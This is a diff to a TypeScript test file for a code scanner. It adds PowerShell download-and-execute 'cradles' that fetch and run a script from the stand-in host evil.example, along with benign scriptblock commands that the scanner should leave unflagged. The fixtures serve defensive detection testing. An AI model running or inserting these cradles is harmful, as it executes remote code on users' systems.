@@ -41,6 +41,16 @@ const CRADLES: Record<string, string> = {
     '(New-Object Net.WebClient).DownloadString("https://evil.example/i.ps1") | iex',
   "iex (New-Object System.Net.WebClient)...":
     'iex (New-Object System.Net.WebClient).DownloadString("https://evil.example/i.ps1")',
+  "& ([scriptblock]::Create((irm ...)))":
+    '& ([scriptblock]::Create((irm "https://evil.example/i.ps1")))',
+  "[ScriptBlock]::Create((iwr ...).Content).Invoke()":
+    '[ScriptBlock]::Create((iwr -useb "https://evil.example/i.ps1").Content).Invoke()',
+  "Invoke-Command -ScriptBlock ([scriptblock]::Create(...))":
+    'Invoke-Command -ScriptBlock ([scriptblock]::Create((Invoke-RestMethod "https://evil.example/i.ps1")))',
+  "[System.Management.Automation.ScriptBlock]::Create(WebClient)":
+    '. ([System.Management.Automation.ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("https://evil.example/i.ps1")))',
+  "$ExecutionContext.InvokeCommand.InvokeScript((irm ...))":
+    '$ExecutionContext.InvokeCommand.InvokeScript((irm "https://evil.example/i.ps1"))',
 };
 
 test("powershell cradles downloading and executing code are unsafe execution", () => {
@@ -73,6 +83,9 @@ test("benign powershell commands keep no unsafe-execution finding", () => {
     "powershell -ExecutionPolicy Bypass -File setup.ps1",
     "pwsh -File setup.ps1",
     "# Note: run irm or iex in documentation",
+    '[scriptblock]::Create("Write-Host ready").Invoke()',
+    "& ([scriptblock]::Create((Get-Content ./local.ps1 -Raw)))",
+    '$ExecutionContext.InvokeCommand.InvokeScript("Get-Date")',
   ]) {
     const inspection = inspectRepository({
       files: [
